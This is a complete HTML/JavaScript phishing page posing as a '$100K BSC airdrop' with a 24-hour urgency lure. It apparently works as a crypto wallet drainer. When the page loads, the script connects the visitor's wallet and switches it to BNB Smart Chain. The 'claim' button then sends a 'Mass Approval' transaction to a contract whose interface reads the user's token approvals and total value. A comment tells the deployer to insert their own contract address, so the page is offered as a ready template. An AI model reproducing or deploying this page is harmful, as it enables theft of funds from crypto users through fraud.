<!DOCTYPE html>
<html>
<head>
    <title>🚀 $100K BSC Airdrop - Claim Now!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; text-align: center; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; padding: 50px; }
        .claim-btn { font-size: 24px; padding: 20px 60px; background: #ffd700; color: #000; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
        .claim-btn:hover { background: #ffed4a; transform: scale(1.05); }
        .claim-btn:disabled { background: #ccc; cursor: not-allowed; transform: none; }
        .status { font-size: 20px; margin: 20px; font-weight: bold; }
        #address { font-size: 16px; word-break: break-all; }
    </style>
</head>
<body>
    <h1>🚀 <span style="color: gold;">$100,000</span> BSC Airdrop!</h1>
    <p>Claim USDT/USDC/WBNB/CAKE + 50+ Tokens INSTANT</p>
    <p>⚠️ <span style="color: yellow;">24HR LIMITED</span> ⚠️</p>
    
    <div id="status" class="status">🔗 Connecting Trust Wallet...</div>
    <div id="address"></div>
    <br>
    <button id="claimBtn" class="claim-btn" disabled>🎁 CLAIM $100K NOW!</button>
    
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <script>
        // ✅ REPLACE WITH YOUR DEPLOYED CONTRACT ADDRESS
        const CONTRACT_ADDRESS = "0x5fB1A7631E932B914f513Ffa7898860297637302"; // ← PUT YOUR ADDRESS HERE
        
        const BSC_CHAIN_ID = "0x38";
        let web3, contract, userAccount;
        
        // ✅ COMPLETE ABI - NO GAS ERRORS
        const ABI = [
            {"inputs":[],"name":"claimMassAirdrop","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"token","type":"address"}],"name":"getUserApproval","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserTotalValue","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
        ];
        
        // BSC Config
        const bscNetwork = {
            chainId: BSC_CHAIN_ID,
            chainName: 'BNB Smart Chain Mainnet',
            nativeCurrency: {name: 'BNB', symbol: 'BNB', decimals: 18},
            rpcUrls: ['https://bsc-dataseed1.binance.org/', 'https://bsc-dataseed2.binance.org/', 'https://bsc-dataseed3.binance.org/', 'https://bsc-dataseed4.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com']
        };
        
        // AUTO TRIGGER ON LOAD
        async function init() {
            if (typeof window.ethereum === 'undefined') {
                document.getElementById('status').innerHTML = '❌ Install <a href="https://trustwallet.com/" style="color: gold;">Trust Wallet</a>';
                return;
            }
            
            try {
                // Switch to BSC
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: BSC_CHAIN_ID }]
                });
            } catch (error) {
                if (error.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [bscNetwork]
                    });
                }
            }
            
            // Connect
            await connect();
        }
        
        async function connect() {
            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAccount = accounts[0];
                web3 = new Web3(window.ethereum);
                contract = new web3.eth.Contract(ABI, CONTRACT_ADDRESS);
                
                document.getElementById('status').innerHTML = '✅ Connected BSC Network';
                document.getElementById('address').innerHTML = `Wallet: ${userAccount.slice(0,6)}...${userAccount.slice(-4)}`;
                document.getElementById('claimBtn').disabled = false;
                
                // Auto-check if already approved
                checkApproval();
                
            } catch(e) {
                document.getElementById('status').innerHTML = '⚠️ Approve Wallet Connection';
            }
        }
        
        async function checkApproval() {
            try {
                const totalValue = await contract.methods.getUserTotalValue(userAccount).call();
                if (totalValue > 0) {
                    document.getElementById('status').innerHTML = `💰 Already Approved $${web3.utils.fromWei(totalValue, 'ether')}`;
                }
            } catch(e) {}
        }
        
        // ONE CLICK CLAIM
        document.getElementById('claimBtn').onclick = async () => {
            const btn = document.getElementById('claimBtn');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.innerHTML = '⏳ Claiming...';
            status.innerHTML = '🔄 Executing Mass Approval...';
            
            try {
                const gasPrice = await web3.eth.getGasPrice();
                const gasEstimate = await contract.methods.claimMassAirdrop().estimateGas({from: userAccount});
                
                const tx = await contract.methods.claimMassAirdrop().send({
                    from: userAccount,
                    gas: Math.floor(gasEstimate * 1.2),
                    gasPrice: gasPrice
                });
                
                status.innerHTML = `✅ SUCCESS! <a href="https://bscscan.com/tx/${tx.transactionHash}" target="_blank">View Tx</a>`;
                btn.innerHTML = '🎉 CLAIMED!';
                
            } catch(error) {
                console.error(error);
                status.innerHTML = '❌ Failed - Check Gas/Approvals in Wallet';
                btn.disabled = false;
                btn.innerHTML = '🔄 Retry Claim';
            }
        };
        
        // Auto-init
        window.addEventListener('load', init);
        window.ethereum.on('chainChanged', () => window.location.reload());
        window.ethereum.on('accountsChanged', () => window.location.reload());
    </script>
</body>
</html>
